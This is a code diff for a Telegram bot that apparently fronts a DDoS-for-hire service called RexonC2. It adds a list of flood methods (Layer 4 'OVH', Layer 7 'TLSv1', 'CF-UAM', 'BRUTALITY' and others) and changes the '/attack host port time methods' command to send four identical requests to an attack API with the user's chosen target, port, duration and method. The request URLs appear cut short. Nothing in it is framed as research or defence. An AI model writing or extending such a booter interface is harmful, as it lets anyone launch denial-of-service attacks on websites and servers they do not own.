@@ -23,12 +23,6 @@ bot.command('start', async (lol) => {
 	await lol.deleteMessage()
 })
 
-bot.command('methods', async (lol) => {
-	user = tele.getUser(lol.message.from)
-	await help.methods(lol, user.full_name)
-	await lol.deleteMessage()
-})
-
 bot.command('help', async (lol) => {
 	user = tele.getUser(lol.message.from)
 	await help.help(lol, user.full_name, lol.message.from.id.toString())
@@ -133,12 +127,19 @@ bot.on('message', async (lol) => {
 				await help.help(lol, user.full_name, lol.message.from.id.toString())
 				break
 
+			case 'methods':
+				await reply('RexonC2 Methods List\n\nLayer 4\n- OVH\n\nLayer 7\n- TLSv1\n- TLSv2\n- DCOUNT\n- CF-UAM\n- BRUTALITY')
+				break
+
 			case 'attack':
 				if (args.length == 0) return await reply(`Example: /attack host port time methods`)
 				if (args.length == 1) return await reply(`Example: /attack host port time methods`)
 				if (args.length == 2) return await reply(`Example: /attack host port time methods`)
 				if (args.length == 3) return await reply(`Example: /attack host port time methods`)
-				axios.get(`host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
+				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
+				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
+				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
+				axios.get(`&host=${args[0]}&port=${args[1]}&time=${args[2]}&method=${args[3]}`)
 				await reply(`Succesfully Sent @rexonc2 : ${args[0]}\nTime : ${args[2]}\nMethods : ${args[3]}`)
 				break
 
